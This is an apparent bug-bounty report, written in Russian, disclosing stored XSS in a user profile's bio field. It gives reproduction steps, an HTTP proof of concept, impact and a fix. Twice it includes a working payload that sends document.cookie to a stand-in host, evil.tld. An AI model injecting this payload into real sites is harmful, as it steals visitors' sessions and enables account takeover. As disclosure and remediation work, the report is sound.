# Vulnerability Overview
Поле bio в профиле пользователя сохраняется без санитизации и рендерится как HTML на странице просмотра профиля, что позволяет внедрить JavaScript, выполняемый в контексте любого посетителя профиля.

# Affected Endpoint / Component
**Endpoint:** `PUT /api/v2/user/profile`
**Component:** Профиль пользователя (User Profile Service)
**Environment:** Production

# Technical Details

**Root cause:**
Значение bio сохраняется в БД как есть и вставляется в DOM через innerHTML без санитизации на этапе рендеринга.

**Exploit mechanism:**
1) Payload сохраняется в БД. 2) При рендере профиля значение попадает в innerHTML. 3) onerror-обработчик выполняется в origin приложения.

**Security assumption broken:**
Данные, контролируемые атакующим (bio), исполняются как код в браузере жертвы (данные → код)

# Steps to Reproduce

1. Зарегистрировать аккаунт A, зайти в настройки профиля
2. В поле bio вставить: <img src=x onerror="fetch('//evil.tld/?c='+document.cookie)">
3. Сохранить профиль (PUT /api/v2/user/profile)
4. Аккаунтом B (или админом) открыть страницу профиля A
5. Наблюдать: выполняется JS, cookie отправляется на evil.tld

# Proof of Concept

```
PUT /api/v2/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=A...

{"bio": "<img src=x onerror=\"fetch('//evil.tld/?c='+document.cookie)\">"}
```

# Security Impact

**Confidentiality:** Session cookies и данные, доступные жертве
**Integrity:** Действия от имени жертвы (изменение email/пароля)
**Availability:** Отсутствует

**Practical attack scenario:**
Атакующий готовит профиль, отправляет ссылку на свой профиль поддержке/админу, получает их сессию

**Worst-case business outcome:**
Захват админской сессии → доступ к админ-панели → массовая компрометация данных

# Suggested Fix
Использовать textContent вместо innerHTML при рендере bio; добавить CSP с nonce и запретом inline-скриптов; на входе — серверную санитизацию (DOMPurify) с allowlist.

---
*Severity: High | 2026-10-29*